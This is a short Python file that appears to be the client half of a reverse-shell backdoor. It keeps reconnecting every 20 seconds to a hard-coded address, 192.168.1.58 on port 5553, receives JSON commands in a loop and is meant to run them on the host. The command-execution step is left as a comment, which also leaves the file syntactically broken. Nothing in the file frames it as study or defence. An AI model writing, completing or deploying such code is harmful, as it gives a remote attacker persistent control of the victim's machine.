import socket
import time
import json

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())
    
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()#bytes
            return json.loads(data)
        except ValueError:
            continue

def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(('192.168.1.58',5553))
			shell()
			s.close()
		except:
			connection()
                        
def shell():
      while True:
            cmd = reliable_recv()
            if cmd == 'exit':
                  break
            else:
                  #execute the command


s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()

